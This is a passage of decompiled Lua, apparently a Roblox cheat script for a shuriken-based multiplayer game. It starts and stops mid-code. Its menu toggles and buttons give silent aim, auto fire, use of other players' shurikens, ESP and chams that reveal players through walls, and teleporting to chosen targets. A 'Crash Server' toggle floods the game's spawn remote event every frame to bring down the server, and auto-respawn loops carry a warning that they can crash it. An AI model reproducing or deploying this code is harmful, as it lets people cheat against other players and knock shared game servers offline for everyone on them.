        vu67.AimPart:OnChanged(function(p1347)
            vu70.AimPart = p1347
        end)
        vu67.HitEventWeapon:OnChanged(function(p1348)
            local v1349, v1350, v1351 = pairs(vu70.HitEventWeapons)
            while true do
                local v1352
                v1351, v1352 = v1349(v1350, v1351)
                if v1351 == nil then
                    break
                end
                if p1348[v1351] then
                    vu70.HitEventWeapons[v1351] = true
                else
                    vu70.HitEventWeapons[v1351] = false
                end
            end
        end)
        vu67.AutoEquipWeapon:OnChanged(function(p1353)
            local v1354, v1355, v1356 = pairs(vu70.AutoEquipWeapons)
            while true do
                local v1357
                v1356, v1357 = v1354(v1355, v1356)
                if v1356 == nil then
                    break
                end
                if p1353[v1356] then
                    vu70.AutoEquipWeapons[v1356] = true
                else
                    vu70.AutoEquipWeapons[v1356] = false
                end
            end
        end)
        v1331:AddToggle("AirStrikeMode", {
            Title = "Airstrike Mode",
            Description = "Enables airstrike mode. This forces shurikens to go up into the air and rain down on players when shot.",
            Default = false,
            Callback = function(p1358)
                if p1358 then
                    vu70.AirStrikeMode = true
                else
                    vu70.AirStrikeMode = false
                end
            end
        })
        v1331:AddToggle("TeleportShuriken", {
            Title = "Teleport Shuriken",
            Description = "Skips moving the shuriken to the player\'s hitpart and instead teleports it directly to them.",
            Default = false,
            Callback = function(p1359)
                if p1359 then
                    vu70.TeleportShuriken = true
                else
                    vu70.TeleportShuriken = false
                end
            end
        })
        v1331:AddToggle("OptionalShurikenEquip", {
            Title = "Optional Shuriken Equip",
            Description = "Makes it so equipping a shuriken is optional with auto fire. Meaning it will fire at people even if you don\'t have a shuriken equipped.",
            Default = false,
            Callback = function(p1360)
                if p1360 then
                    vu70.OptionalEquip = true
                else
                    vu70.OptionalEquip = false
                end
            end
        })
        v1331:AddToggle("UseServerShurikens", {
            Title = "Use Server Shurikens",
            Description = "Uses the whole server\'s shurikens when firing. They all do your damage still.",
            Default = false,
            Callback = function(p1361)
                if p1361 then
                    vu70.ServerShurikens = true
                else
                    vu70.ServerShurikens = false
                end
            end
        })
        v1331:AddToggle("PlayerShurikenCheck", {
            Title = "Player Shuriken Check",
            Description = "Checks for the shuriken of the player that you are shooting and doesn\'t use it because it would do your damage to you.",
            Default = false,
            Callback = function(p1362)
                if p1362 then
                    vu70.PlayerShurikenCheck = true
                else
                    vu70.PlayerShurikenCheck = false
                end
            end
        })
        v1331:AddToggle("ShotgunFire", {
            Title = "Shotgun Fire",
            Description = "Enables a shotgun-like spread for shurikens. Useful for when players are running away.",
            Default = false,
            Callback = function(p1363)
                if p1363 then
                    vu70.ShotgunFire = true
                else
                    vu70.ShotgunFire = false
                end
            end
        })
        v1331:AddToggle("FireOnGodMode", {
            Title = "Fire On Godded Players",
            Description = "Allows auto fire and silent aim to fire shurikens even when the player it\'s firing at is godded.",
            Default = false,
            Callback = function(p1364)
                if p1364 then
                    vu70.FireOnGodMode = true
                else
                    vu70.FireOnGodMode = false
                end
            end
        })
        v1331:AddToggle("AltAutoBubble", {
            Title = "Alternate Auto Bubble",
            Description = "Alternate mode of auto bubble that allows you to take weapons out.",
            Default = false,
            Callback = function(p1365)
                if p1365 then
                    vu70.AltAutoBubble = true
                else
                    vu70.AltAutoBubble = false
                end
            end
        })
        v1331:AddInput("AirStrikeDistance", {
            Title = "Air Strike Distance",
            Description = "Congifure air strike distance.",
            Default = vu70.AirStrikeDistance,
            Placeholder = "Enter a number..",
            Numeric = true,
            Finished = true,
            Callback = function(p1366)
                vu70.AirStrikeDistance = tonumber(p1366)
            end
        })
        v1331:AddInput("ShotgunFireSpread", {
            Title = "Shotgun Fire Spread",
            Description = "Configure shotgun fire spread.",
            Default = vu70.ShotgunFireSpread,
            Placeholder = "Enter a number..",
            Numeric = true,
            Finished = true,
            Callback = function(p1367)
                vu70.ShotgunFireSpread = tonumber(p1367)
            end
        })
        v1331:AddInput("LoopbringDistance", {
            Title = "Loop Bring Distance",
            Description = "Configure loop bring distance.",
            Default = vu70.LoopBringDistance,
            Placeholder = "Enter a number..",
            Numeric = true,
            Finished = true,
            Callback = function(p1368)
                vu70.LoopBringDistance = tonumber(p1368)
            end
        })
        v1331:AddInput("SaviorPercent", {
            Title = "Savior Health Percent",
            Description = "Configure savior percent",
            Default = vu70.SaviorPercent,
            Placeholder = "Enter a number..",
            Numeric = true,
            Finished = true,
            Callback = function(p1369)
                vu70.SaviorPercent = tonumber(p1369)
            end
        })
        v1331:AddInput("PredictModeOffset", {
            Title = "Predict Mode Offset",
            Description = "Configure predict mode offset",
            Default = vu70.PredictModeOffset,
            Placeholder = "Enter a number..",
            Numeric = true,
            Finished = true,
            Callback = function(p1370)
                vu70.PredictModeOffset = tonumber(p1370)
            end
        })
        v1331:AddInput("AutoFireWait", {
            Title = "Auto Fire Wait",
            Description = "Configure fire wait time",
            Default = vu70.AutoFireWait,
            Placeholder = "Enter a number..",
            Numeric = true,
            Finished = true,
            Callback = function(p1371)
                vu70.AutoFireWait = tonumber(p1371)
            end
        })
        v1331:AddInput("AutoFireFinishWait", {
            Title = "Auto Fire Finish Wait",
            Description = "Configure wait time at finish",
            Default = vu70.AutoFireFinishWait,
            Placeholder = "Enter a number..",
            Numeric = true,
            Finished = true,
            Callback = function(p1372)
                vu70.AutoFireFinishWait = tonumber(p1372)
            end
        })
        v1331:AddInput("HitEventWait", {
            Title = "Hit Event Wait",
            Description = "Configure hit event wait",
            Default = vu70.HitEventWait,
            Placeholder = "Enter a number..",
            Numeric = true,
            Finished = true,
            Callback = function(p1373)
                vu70.HitEventWait = tonumber(p1373)
            end
        })
        v1331:AddInput("HitEventFinishWait", {
            Title = "Hit Event Finish Wait",
            Description = "Configure hit event finish wait",
            Default = vu70.HitEventFinishWait,
            Placeholder = "Enter a number..",
            Numeric = true,
            Finished = true,
            Callback = function(p1374)
                vu70.HitEventFinishWait = tonumber(p1374)
            end
        })
    end
    local function v1503()
        vu476({
            SelectedPlayers = {},
            ESP = false,
            Chams = false,
            WeaponESP = false,
            WeaponChams = false,
            ESPSettings = {
                Distance = false,
                State = false,
                Bubble = false,
                Godded = false
            }
        })
        local v1376 = vu457.Players:AddSection("Dropdowns")
        local v1377 = v1376.AddDropdown
        local v1378 = {
            Title = "Player List"
        }
        local v1379 = vu53
        v1378.Values = vu71.PlayersToStrings(v1379:GetPlayers())
        v1378.Multi = true
        v1378.Default = vu70.SelectedPlayers
        v1377(v1376, "PlayerList", v1378)
        vu67.PlayerList:OnChanged(function(p1380)
            local v1381 = vu53
            local v1382, v1383, v1384 = pairs(v1381:GetPlayers())
            while true do
                local v1385
                v1384, v1385 = v1382(v1383, v1384)
                if v1384 == nil then
                    break
                end
                if not p1380[v1385.Name] and vu70.SelectedPlayers[v1385.Name] then
                    vu70.SelectedPlayers[v1385.Name] = nil
                end
            end
            local v1386, v1387, v1388 = pairs(p1380)
            while true do
                local v1389
                v1388, v1389 = v1386(v1387, v1388)
                if v1388 == nil then
                    break
                end
                if not vu70.SelectedPlayers[v1388] then
                    vu70.SelectedPlayers[v1388] = true
                    if vu53:FindFirstChild(v1388) then
                        local v1390 = vu53
                        vu71.AddPlayerVanities(v1390:FindFirstChild(v1388), true)
                    end
                end
            end
        end)
        v1376:AddToggle("AddAllPlayers", {
            Title = "Add All Players",
            Default = false,
            Callback = function(p1391)
                if p1391 then
                    local v1392 = vu53
                    local v1393, v1394, v1395 = pairs(v1392:GetPlayers())
                    while true do
                        local v1396
                        v1395, v1396 = v1393(v1394, v1395)
                        if v1395 == nil then
                            break
                        end
                        vu70.SelectedPlayers[v1396.Name] = true
                        vu71.AddPlayerVanities(v1396)
                    end
                    function vu71.PlayerAdded.AddAllPlayers(p1397)
                        vu70.SelectedPlayers[p1397.Name] = true
                    end
                    function vu71.PlayerRemoved.AddAllPlayers(p1398)
                        vu70.SelectedPlayers[p1398.Name] = nil
                    end
                else
                    pcall(function()
                        vu71.PlayerAdded.AddAllPlayers = nil
                        vu71.PlayerRemoved.AddAllPlayers = nil
                    end)
                end
            end
        })
        v1376:AddButton({
            Title = "Remove All Players",
            Callback = function()
                local v1399 = vu53
                local v1400, v1401, v1402 = pairs(v1399:GetPlayers())
                while true do
                    local v1403
                    v1402, v1403 = v1400(v1401, v1402)
                    if v1402 == nil then
                        break
                    end
                    vu70.SelectedPlayers[v1403.Name] = nil
                    vu71.RemovePlayerVanities(v1403)
                end
            end
        })
        v1376:AddButton({
            Title = "Refresh Player List",
            Callback = function()
                local v1404 = vu53
                vu67.PlayerList:SetValues(vu71.PlayersToStrings(v1404:GetPlayers()))
                vu67.PlayerList:SetValue(vu70.SelectedPlayers)
            end
        })
        local v1405 = vu457.Players:AddSection("Buttons")
        v1405:AddButton({
            Title = "Goto Selected Players",
            Description = "Teleports you to the players that you select. Works best if you just select one at a time.",
            Callback = function()
                local v1406, v1407, v1408 = pairs(vu70.SelectedPlayers)
                while true do
                    local v1409
                    v1408, v1409 = v1406(v1407, v1408)
                    if v1408 == nil then
                        break
                    end
                    if vu53:FindFirstChild(v1408) and (vu53[v1408].Character and (vu71.GetRoot(vu53[v1408].Character) and (vu71.GetRoot(vu64) and vu53[v1408] ~= vu53.LocalPlayer))) then
                        vu71.GetRoot(vu64).CFrame = vu71.GetRoot(vu53[v1408].Character).CFrame
                    end
                end
            end
        })
        v1405:AddButton({
            Title = "Delete Selected Characters",
            Description = "Deletes the currently selected players\' characters from your screen. They can still hit you, however, they won\'t be able to lag you anymore.",
            Callback = function()
                local v1410, v1411, v1412 = pairs(vu70.SelectedPlayers)
                while true do
                    local v1413
                    v1412, v1413 = v1410(v1411, v1412)
                    if v1412 == nil then
                        break
                    end
                    if vu53:FindFirstChild(v1412) and (vu53[v1412].Character and vu53[v1412] ~= vu53.LocalPlayer) then
                        vu53[v1412].Character:Destroy()
                    end
                end
            end
        })
        v1405:AddButton({
            Title = "Delete Selected Players",
            Description = "Deletes the currently selected players from your screen. They can still hit you. This deletes their player INSTANCE from the game, meaning you won\'t be able to see them on your screen at all.",
            Callback = function()
                local v1414, v1415, v1416 = pairs(vu70.SelectedPlayers)
                while true do
                    local v1417
                    v1416, v1417 = v1414(v1415, v1416)
                    if v1416 == nil then
                        break
                    end
                    if vu53:FindFirstChild(v1416) and vu53[v1416] ~= vu53.LocalPlayer then
                        vu53[v1416]:Destroy()
                    end
                end
            end
        })
        v1405:AddButton({
            Title = "Delete Players\' Tools",
            Description = "Deletes the currently selected players\' tools from their inventories. Only shows on your screen.",
            Callback = function()
                local v1418, v1419, v1420 = pairs(vu70.SelectedPlayers)
                while true do
                    local v1421, _ = v1418(v1419, v1420)
                    if v1421 == nil then
                        break
                    end
                    if vu53:FindFirstChild(v1421) and (vu53[v1421]:FindFirstChild("Backpack") and vu53[v1421] ~= vu53.LocalPlayer) then
                        local v1422, v1423, v1424 = pairs(vu53[v1421].Backpack:GetChildren())
                        v1420 = v1421
                        while true do
                            local v1425
                            v1424, v1425 = v1422(v1423, v1424)
                            if v1424 == nil then
                                break
                            end
                            v1425:Destroy()
                        end
                        if vu53[v1421].Character then
                            local v1426, v1427, v1428 = pairs(vu53[v1421].Character:GetChildren())
                            while true do
                                local v1429
                                v1428, v1429 = v1426(v1427, v1428)
                                if v1428 == nil then
                                    break
                                end
                                if v1429:IsA("Tool") then
                                    v1429:Destroy()
                                end
                            end
                        end
                    else
                        v1420 = v1421
                    end
                end
            end
        })
        v1405:AddButton({
            Title = "Delete Players\' Bubbles",
            Description = "Deletes the currently selected players\' bubbles from their characters. Only shows on your screen.",
            Callback = function()
                local v1430, v1431, v1432 = pairs(vu70.SelectedPlayers)
                while true do
                    local v1433
                    v1432, v1433 = v1430(v1431, v1432)
                    if v1432 == nil then
                        break
                    end
                    if vu53:FindFirstChild(v1432) and (vu53[v1432].Character and vu53[v1432] ~= vu53.LocalPlayer) then
                        local v1434, v1435, v1436 = pairs(vu53[v1432].Character)
                        while true do
                            local v1437
                            v1436, v1437 = v1434(v1435, v1436)
                            if v1436 == nil then
                                break
                            end
                            if v1437.Name == "ForceField" then
                                v1437:Destroy()
                            end
                        end
                    end
                end
            end
        })
        local v1438 = vu457.Players:AddSection("Toggles")
        v1438:AddToggle("ESP", {
            Title = "ESP",
            Description = "Displays a player\'s name and certain info about the player above their head.",
            Default = false,
            Callback = function(p1439)
                if p1439 then
                    vu70.ESP = true
                    local v1440, v1441, v1442 = pairs(vu70.SelectedPlayers)
                    while true do
                        local v1443
                        v1442, v1443 = v1440(v1441, v1442)
                        if v1442 == nil then
                            break
                        end
                        if vu53:FindFirstChild(v1442) then
                            local v1444 = vu53
                            vu71.ESP(v1444:FindFirstChild(v1442))
                        else
                            vu70.SelectedPlayers[v1442] = nil
                        end
                    end
                else
                    pcall(function()
                        vu70.ESP = false
                        local v1445 = vu57
                        local v1446, v1447, v1448 = pairs(v1445:GetChildren())
                        while true do
                            local v1449
                            v1448, v1449 = v1446(v1447, v1448)
                            if v1448 == nil then
                                break
                            end
                            if string.sub(v1449.Name, - 7) == "_PNAESP" then
                                v1449:Destroy()
                            end
                        end
                    end)
                end
            end
        })
        v1438:AddToggle("Chams", {
            Title = "Chams",
            Description = "Displays where players are using your preferred method of chams. Default is BoxHandleAdornment.",
            Default = false,
            Callback = function(p1450)
                if p1450 then
                    vu70.Chams = true
                    local v1451, v1452, v1453 = pairs(vu70.SelectedPlayers)
                    while true do
                        local v1454
                        v1453, v1454 = v1451(v1452, v1453)
                        if v1453 == nil then
                            break
                        end
                        if vu53:FindFirstChild(v1453) then
                            local v1455 = vu53
                            vu71.Chams(v1455:FindFirstChild(v1453))
                        else
                            vu70.SelectedPlayers[v1453] = nil
                        end
                    end
                else
                    pcall(function()
                        vu70.Chams = false
                        local v1456 = vu57
                        local v1457, v1458, v1459 = pairs(v1456:GetChildren())
                        while true do
                            local v1460
                            v1459, v1460 = v1457(v1458, v1459)
                            if v1459 == nil then
                                break
                            end
                            if string.sub(v1460.Name, - 8) == "_PNACHMS" then
                                v1460:Destroy()
                            end
                        end
                    end)
                end
            end
        })
        v1438:AddToggle("WeaponESP", {
            Title = "Weapon ESP",
            Description = "Displays a player\'s weapon names when they take them out.",
            Default = false,
            Callback = function(p1461)
                if p1461 then
                    vu70.WeaponESP = true
                    local v1462, v1463, v1464 = pairs(vu70.SelectedPlayers)
                    while true do
                        local v1465
                        v1464, v1465 = v1462(v1463, v1464)
                        if v1464 == nil then
                            break
                        end
                        if vu53:FindFirstChild(v1464) then
                            local v1466 = vu53
                            vu71.WeaponESP(v1466:FindFirstChild(v1464))
                        else
                            vu70.SelectedPlayers[v1464] = nil
                        end
                    end
                    function vu71.WorkspaceDescendantAdded.WeaponESP(pu1467)
                        if not pu1467:FindFirstChild("WeaponESP") and ((pu1467.Name == "Shuriken" or pu1467.Name == "Sword") and (pu1467:IsA("Tool") and (vu70.SelectedPlayers[pu1467.Parent.Name] and pu1467.Parent.Name ~= vu53.LocalPlayer.Name)) or pu1467.Name == "ThrownKunai" and (vu71.FormallyWaitForChild(pu1467, "creator") and (vu70.SelectedPlayers[pu1467:FindFirstChild("creator").Value.Name] and pu1467:FindFirstChild("creator").Value ~= vu53.LocalPlayer))) then
                            local function v1468(_)
                                if pu1467.Name ~= "Sword" then
                                    return Color3.fromRGB(255, 0, 0)
                                else
                                    return Color3.fromRGB(255, 167, 25)
                                end
                            end
                            local v1469 = Instance.new("BillboardGui")
                            local v1470 = Instance.new("TextLabel")
                            if pu1467:IsA("Tool") then
                                v1469.Adornee = pu1467:FindFirstChild("Handle")
                            else
                                v1469.Adornee = pu1467
                            end
                            v1469.Parent = pu1467
                            v1469.Size = UDim2.new(0, 100, 0, 150)
                            v1469.StudsOffset = Vector3.new(0, 1, 0)
                            v1469.AlwaysOnTop = true
                            v1469.Name = "WeaponESP"
                            v1470.Parent = v1469
                            v1470.BackgroundTransparency = 1
                            v1470.Position = UDim2.new(0, 0, 0, - 50)
                            v1470.Size = UDim2.new(0, 100, 0, 100)
                            v1470.Font = Enum.Font.SourceSansSemibold
                            v1470.TextSize = 15
                            v1470.TextColor3 = v1468(pu1467.Name)
                            v1470.TextStrokeTransparency = 0
                            v1470.TextYAlignment = Enum.TextYAlignment.Bottom
                            v1470.Text = pu1467.Name
                            v1470.ZIndex = 10
                            v1470.Visible = true
                        end
                    end
                    function vu71.WorkspaceDescendantRemoved.WeaponESP(p1471)
                        if ((p1471.Name == "Shuriken" or p1471.Name == "Sword") and (p1471:IsA("Tool") and (vu70.SelectedPlayers[p1471.Parent.Name] and p1471.Parent.Name ~= vu53.LocalPlayer.Name)) or p1471.Name == "ThrownKunai" and (vu71.FormallyWaitForChild(p1471, "creator") and (vu70.SelectedPlayers[p1471:FindFirstChild("creator").Value] and p1471:FindFirstChild("creator").Value ~= vu53.LocalPlayer))) and p1471:FindFirstChildOfClass("BillboardGui") then
                            p1471:FindFirstChildOfClass("BillboardGui"):Destroy()
                        end
                    end
                else
                    pcall(function()
                        vu70.WeaponESP = false
                        vu71.WorkspaceDescendantAdded.WeaponESP = nil
                        vu71.WorkspaceDescendantRemoved.WeaponESP = nil
                        local v1472, v1473, v1474 = pairs(vu70.SelectedPlayers)
                        while true do
                            local v1475
                            v1474, v1475 = v1472(v1473, v1474)
                            if v1474 == nil then
                                break
                            end
                            if vu53:FindFirstChild(v1474) and vu53:FindFirstChild(v1474).Character then
                                local v1476, v1477, v1478 = pairs(vu53:FindFirstChild(v1474).Character:GetChildren())
                                while true do
                                    local v1479
                                    v1478, v1479 = v1476(v1477, v1478)
                                    if v1478 == nil then
                                        break
                                    end
                                    if v1479:FindFirstChild("WeaponESP") then
                                        v1479:FindFirstChild("WeaponESP"):Destroy()
                                    end
                                end
                            end
                        end
                    end)
                end
            end
        })
        v1438:AddToggle("WeaponChams", {
            Title = "Weapon Chams",
            Description = "Displays a player\'s weapon via box handle adornment when they take their weapons out.",
            Default = false,
            Callback = function(p1480)
                if p1480 then
                    vu70.WeaponChams = true
                    local v1481, v1482, v1483 = pairs(vu70.SelectedPlayers)
                    while true do
                        local v1484
                        v1483, v1484 = v1481(v1482, v1483)
                        if v1483 == nil then
                            break
                        end
                        if vu53:FindFirstChild(v1483) then
                            local v1485 = vu53
                            vu71.WeaponChams(v1485:FindFirstChild(v1483))
                        else
                            vu70.SelectedPlayers[v1483] = nil
                        end
                    end
                    function vu71.WorkspaceDescendantAdded.WeaponChams(pu1486)
                        if not pu1486:FindFirstChild("WeaponChams") and ((pu1486.Name == "Shuriken" or pu1486.Name == "Sword") and (pu1486:IsA("Tool") and (vu70.SelectedPlayers[pu1486.Parent.Name] and pu1486.Parent.Name ~= vu53.LocalPlayer.Name)) or pu1486.Name == "ThrownKunai" and (vu71.FormallyWaitForChild(pu1486, "creator") and (vu70.SelectedPlayers[pu1486:FindFirstChild("creator").Value.Name] and pu1486:FindFirstChild("creator").Value ~= vu53.LocalPlayer))) then
                            local function v1487(_)
                                if pu1486.Name ~= "Sword" then
                                    return Color3.fromRGB(255, 0, 0)
                                else
                                    return Color3.fromRGB(255, 167, 25)
                                end
                            end
                            local v1488 = Instance.new("BoxHandleAdornment")
                            v1488.Name = "WeaponChams"
                            v1488.Parent = pu1486
                            if pu1486:IsA("Tool") then
                                if pu1486.Name ~= "Sword" then
                                    v1488.Adornee = pu1486:FindFirstChild("Handle")
                                    v1488.Size = Vector3.new(1.5, 0.5, 1.5)
                                else
                                    v1488.Adornee = pu1486:FindFirstChild("Handle")
                                    v1488.Size = pu1486:FindFirstChild("Handle").Size
                                end
                            else
                                v1488.Adornee = pu1486
                                v1488.Size = Vector3.new(1.5, 0.5, 1.5)
                            end
                            v1488.AlwaysOnTop = true
                            v1488.ZIndex = 10
                            v1488.Transparency = 0.3
                            v1488.Color3 = v1487(pu1486.Name)
                            v1488.Visible = true
                        end
                    end
                    function vu71.WorkspaceDescendantRemoved.WeaponChams(p1489)
                        if ((p1489.Name == "Shuriken" or p1489.Name == "Sword") and (p1489:IsA("Tool") and (vu70.SelectedPlayers[p1489.Parent.Name] and p1489.Parent.Name ~= vu53.LocalPlayer.Name)) or p1489.Name == "ThrownKunai" and (vu71.FormallyWaitForChild(p1489, "creator") and (vu70.SelectedPlayers[p1489:FindFirstChild("creator").Value] and p1489:FindFirstChild("creator").Value ~= vu53.LocalPlayer))) and p1489:FindFirstChildOfClass("BoxHandleAdornment") then
                            p1489:FindFirstChildOfClass("BoxHandleAdornment"):Destroy()
                        end
                    end
                else
                    pcall(function()
                        vu70.WeaponChams = false
                        vu71.WorkspaceDescendantAdded.WeaponChams = nil
                        vu71.WorkspaceDescendantRemoved.WeaponChams = nil
                        local v1490, v1491, v1492 = pairs(vu70.SelectedPlayers)
                        while true do
                            local v1493
                            v1492, v1493 = v1490(v1491, v1492)
                            if v1492 == nil then
                                break
                            end
                            if vu53:FindFirstChild(v1492) and vu53:FindFirstChild(v1492).Character then
                                local v1494, v1495, v1496 = pairs(vu53:FindFirstChild(v1492).Character:GetChildren())
                                while true do
                                    local v1497
                                    v1496, v1497 = v1494(v1495, v1496)
                                    if v1496 == nil then
                                        break
                                    end
                                    if v1497:FindFirstChild("WeaponChams") then
                                        v1497:FindFirstChild("WeaponChams"):Destroy()
                                    end
                                end
                            end
                        end
                    end)
                end
            end
        })
        vu457.Players:AddSection("Settings"):AddDropdown("ESPSettings", {
            Title = "ESP Settings",
            Description = "Settings for ESP",
            Values = vu73.ESPText,
            Multi = true,
            Default = {}
        })
        vu67.ESPSettings:OnChanged(function(p1498)
            local v1499, v1500, v1501 = pairs(vu70.ESPSettings)
            while true do
                local v1502
                v1501, v1502 = v1499(v1500, v1501)
                if v1501 == nil then
                    break
                end
                if p1498[v1501] then
                    vu70.ESPSettings[v1501] = true
                else
                    vu70.ESPSettings[v1501] = false
                end
            end
        end)
    end
    local function v1559()
        local v1504 = vu457.Server:AddSection("Buttons")
        v1504:AddButton({
            Title = "Main Respawn",
            Description = "Respawns you manually to the main spawn area.",
            Callback = function()
                game:GetService("ReplicatedStorage"):WaitForChild("RemoteEvent"):WaitForChild("SpawnCharacterEvent"):FireServer("MainSpawn")
            end
        })
        v1504:AddButton({
            Title = "Random Respawn",
            Description = "Respawns you manually to a random spawn area.",
            Callback = function()
                game:GetService("ReplicatedStorage"):WaitForChild("RemoteEvent"):WaitForChild("SpawnCharacterEvent"):FireServer("RandomSpawn")
            end
        })
        local v1505 = vu457.Server:AddSection("Toggles")
        vu476({
            AutoRandomRespawn = false,
            AutoRandomRespawnWait = 0.25
        })
        v1505:AddToggle("AutoRandomRespawn", {
            Title = "Auto Random Respawn",
            Description = "Automatically clicks the \'random respawn\' button in game until toggled off. !!CAUTION: DO NOT SET THE WAIT TIME TOO LOW OR IT WILL CRASH YOU AND/OR THE SERVER!!",
            Default = false,
            Callback = function(p1506)
                vu70.AutoRandomRespawn = p1506
                if p1506 then
                    local v1507 = game:GetService("ReplicatedStorage"):WaitForChild("RemoteEvent"):WaitForChild("SpawnCharacterEvent")
                    local vu1508 = {
                        game:GetService("RunService").Stepped,
                        game:GetService("RunService").Heartbeat,
                        game:GetService("RunService").RenderStepped
                    }
                    local vu1509 = 0
                    local function v1510()
                        if vu70.AutoRandomRespawnWait < 0 then
                            if vu70.AutoRandomRespawnWait <= - 1 then
                                vu1509 = vu1509 + 1
                                vu1508[vu1509]:wait()
                                if vu1509 >= 3 then
                                    vu1509 = 0
                                end
                            end
                        else
                            task.wait(vu70.AutoRandomRespawnWait)
                        end
                    end
                    while vu70.AutoRandomRespawn do
                        v1507:FireServer("RandomSpawn")
                        v1510()
                    end
                end
            end
        })
        vu476({
            AutoMainRespawn = false,
            AutoMainRespawnWait = 0.25
        })
        v1505:AddToggle("AutoMainRespawn", {
            Title = "Auto Main Respawn",
            Description = "Automatically clicks the \'main respawn\' button in game until toggled off. !!CAUTION: DO NOT SET THE WAIT TIME TOO LOW OR IT WILL CRASH YOU AND/OR THE SERVER!!",
            Default = false,
            Callback = function(p1511)
                vu70.AutoMainRespawn = p1511
                if p1511 then
                    local v1512 = game:GetService("ReplicatedStorage"):WaitForChild("RemoteEvent"):WaitForChild("SpawnCharacterEvent")
                    local vu1513 = {
                        game:GetService("RunService").Stepped,
                        game:GetService("RunService").Heartbeat,
                        game:GetService("RunService").RenderStepped
                    }
                    local vu1514 = 0
                    local function v1515()
                        if vu70.AutoMainRespawnWait < 0 then
                            if vu70.AutoMainRespawnWait <= - 1 then
                                vu1514 = vu1514 + 1
                                vu1513[vu1514]:wait()
                                if vu1514 >= 3 then
                                    vu1514 = 0
                                end
                            end
                        else
                            task.wait(vu70.AutoMainRespawnWait)
                        end
                    end
                    while vu70.AutoMainRespawn do
                        v1512:FireServer("MainSpawn")
                        v1515()
                    end
                end
            end
        })
        vu476({
            CrashOldVariables = {},
            CrashServiceTable = {},
            CrashServer = false,
            CrashServerSpawn = {
                MainSpawn = true,
                RandomSpawn = false
            },
            CrashServerServices = {
                RenderStepped = true,
                Stepped = false,
                Heartbeat = false
            }
        })
        v1505:AddToggle("CrashServer", {
            Title = "Crash Server",
            Description = "Attempts to crash the server. This will certainly lag you and might break the script. It will also most likely only crash YOU, unless there are others attempting to crash.",
            Default = false,
            Callback = function(p1516)
                vu70.CrashServer = p1516
                if p1516 then
                    local v1517, v1518, v1519 = pairs(vu67)
                    local v1520 = {
                        "CrashServer",
                        "AutoMainRespawn",
                        "AutoRandomRespawn",
                        "Acrylic",
                        "Transparency",
                        "MuteOthersSfx",
                        "MuteYourSfx",
                        "DisableWSChat"
                    }
                    while true do
                        local v1521
                        v1519, v1521 = v1517(v1518, v1519)
                        if v1519 == nil then
                            break
                        end
                        if v1521.Type == "Toggle" and (v1521.Value and not table.find(v1520, v1519)) then
                            vu70.CrashOldVariables[v1519] = true
                            v1521:SetValue(false)
                            task.wait()
                        end
                    end
                    task.wait(1)
                    local vu1522 = game:GetService("ReplicatedStorage"):WaitForChild("RemoteEvent"):WaitForChild("SpawnCharacterEvent")
                    local function v1527()
                        local v1523, v1524, v1525 = pairs(vu70.CrashServerSpawn)
                        while true do
                            local v1526
                            v1525, v1526 = v1523(v1524, v1525)
                            if v1525 == nil then
                                break
                            end
                            if v1526 then
                                vu1522:FireServer(v1525)
                            end
                        end
                    end
                    local v1528, v1529, v1530 = pairs(vu70.CrashServerServices)
                    while true do
                        local v1531
                        v1530, v1531 = v1528(v1529, v1530)
                        if v1530 == nil then
                            break
                        end
                        if v1531 then
                            vu70.CrashServiceTable[v1530] = vu55[v1530]:Connect(v1527)
                        end
                    end
                else
                    local v1532, v1533, v1534 = pairs(vu70.CrashServiceTable)
                    while true do
                        local v1535
                        v1534, v1535 = v1532(v1533, v1534)
                        if v1534 == nil then
                            break
                        end
                        vu70.CrashServiceTable[v1534]:Disconnect()
                        vu70.CrashServiceTable[v1534] = nil
                    end
                    local v1536, v1537, v1538 = pairs(vu67)
                    while true do
                        local v1539
                        v1538, v1539 = v1536(v1537, v1538)
                        if v1538 == nil then
                            break
                        end
                        if v1539.Type == "Toggle" and vu70.CrashOldVariables[v1538] then
                            v1539:SetValue(true)
                            task.wait()
                        end
                    end
                end
            end
        })
        local v1540 = vu457.Server:AddSection("Settings")
        v1540:AddDropdown("CrashServerServices", {
            Title = "Crash Server Services",
            Description = "Configure crash server services.",
            Values = vu73.RunServices,
            Multi = true,
            Default = vu70.CrashServerServices
        })
        v1540:AddDropdown("CrashServerSpawn", {
            Title = "Crash Server Spawn",
            Description = "Configure crash server spawn.",
            Values = {
                "MainSpawn",
                "RandomSpawn"
            },
            Multi = true,
            Default = vu70.CrashServerSpawn
        })
        vu67.CrashServerServices:OnChanged(function(p1541)
            local v1542, v1543, v1544 = pairs(vu70.CrashServerServices)
            while true do
                local v1545
                v1544, v1545 = v1542(v1543, v1544)
                if v1544 == nil then
                    break
                end
                if p1541[v1544] then
                    vu70.CrashServerServices[v1544] = true
                else
                    vu70.CrashServerServices[v1544] = false
                end
            end
        end)
        vu67.CrashServerSpawn:OnChanged(function(p1546)
            local v1547, v1548, v1549 = pairs(vu70.CrashServerSpawn)
            while true do
                local v1550
                v1549, v1550 = v1547(v1548, v1549)
                if v1549 == nil then
                    break
                end
                if p1546[v1549] then
                    vu70.CrashServerSpawn[v1549] = true
                else
                    vu70.CrashServerSpawn[v1549] = false
                end
            end
        end)
        v1540:AddInput("AutoRandomRespawnWait", {
            Title = "Auto Random Respawn Wait",
            Description = "Configure auto random respawn wait",
            Default = vu70.AutoRandomRespawnWait,
            Placeholder = "Enter a number..",
            Numeric = true,
            Finished = true,
            Callback = function(p1551)
                vu70.AutoRandomRespawnWait = tonumber(p1551)
            end
        })
        v1540:AddInput("AutoMainRespawnWait", {
            Title = "Auto Main Respawn Wait",
            Description = "Configure auto main respawn wait.",
            Default = vu70.AutoMainRespawnWait,
            Placeholder = "Enter a number..",
            Numeric = true,
            Finished = true,
            Callback = function(p1552)
                vu70.AutoMainRespawnWait = tonumber(p1552)
            end
        })
        v1540:AddInput("FogStart", {
            Title = "Configure Fog Start",
            Description = "Configure the fog start amount.",
            Default = vu60.FogStart,
            Placeholder = "Enter a number..",
            Numeric = true,
            Finished = true,
            Callback = function(p1553)
                vu60.FogStart = tonumber(p1553)
            end
        })
        v1540:AddInput("FogEnd", {
            Title = "Configure Fog End",
            Description = "Configure the fog end amount.",
            Default = vu60.FogEnd,
            Placeholder = "Enter a number..",
            Numeric = true,
            Finished = true,
            Callback = function(p1554)
                vu60.FogEnd = tonumber(p1554)
            end
        })
        v1540:AddInput("StarCount", {
            Title = "Configure Star Count",
            Description = "Configure the star count in the sky.",
            Default = vu60.Sky.StarCount,
            Placeholder = "Enter a number..",
            Numeric = true,
            Finished = true,
            Callback = function(p1555)
                vu60.Sky.StarCount = tonumber(p1555)
            end
        })
        v1540:AddInput("SunTextureId", {
